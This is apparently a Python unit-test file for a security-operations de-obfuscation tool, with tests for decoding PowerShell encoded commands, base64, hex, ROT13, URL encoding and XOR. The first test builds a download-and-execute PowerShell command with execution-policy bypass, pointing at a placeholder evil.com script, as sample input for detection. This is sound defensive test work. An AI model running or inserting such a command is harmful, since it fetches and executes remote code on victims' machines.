"""Unit tests for SOC De-obfuscator utility."""

import pytest
import base64
from core.deobfuscator import (
    deobfuscate_payload,
    _extract_powershell_encoded,
    _decode_standard_base64,
    _decode_hex_string,
    _decode_rot13,
    _decode_url_multi,
    _xor_bruteforce,
)


def test_powershell_encoded_command_extraction():
    cmd = 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.com/a.ps1")'
    b64_enc = base64.b64encode(cmd.encode("utf-16le")).decode()
    payload = f"powershell.exe -ExecutionPolicy Bypass -enc {b64_enc}"

    results = _extract_powershell_encoded(payload)
    assert len(results) == 1
    decoded = results[0]["decoded_command"]
    assert "DownloadString" in decoded
    assert "invoke-expression" in results[0]["suspicious_cmdlets"] or "iex" in results[0]["suspicious_cmdlets"] or "downloadstring" in results[0]["suspicious_cmdlets"]
    assert "http://evil.com/a.ps1" in results[0]["extracted_urls"]


def test_decode_standard_base64():
    msg = "This is a secret string for analysts."
    b64 = base64.b64encode(msg.encode("utf-8")).decode()
    assert _decode_standard_base64(b64) == msg


def test_decode_hex_string():
    # Continuous hex
    assert _decode_hex_string("48656c6c6f21") == "Hello!"

    # \x hex format
    assert _decode_hex_string(r"\x48\x65\x6c\x6c\x6f") == "Hello"


def test_decode_rot13():
    plain = "TheQuickBrownFox"
    rot = "GurDhvpxOebjaSbk"
    assert _decode_rot13(rot) == plain


def test_decode_url_multi():
    # Double-encoded URL
    encoded = "https%253A%252F%252Fevil.com%252Flogin"
    assert _decode_url_multi(encoded) == "https://evil.com/login"


def test_xor_bruteforce():
    key = 0x5A
    msg = b"http://c2-malware-domain.xyz"
    xored = bytes(b ^ key for b in msg)
    results = _xor_bruteforce(xored)
    assert len(results) > 0
    assert any("http" in r["matches"] for r in results)


def test_deobfuscate_payload_empty():
    res = deobfuscate_payload("")
    assert "error" in res
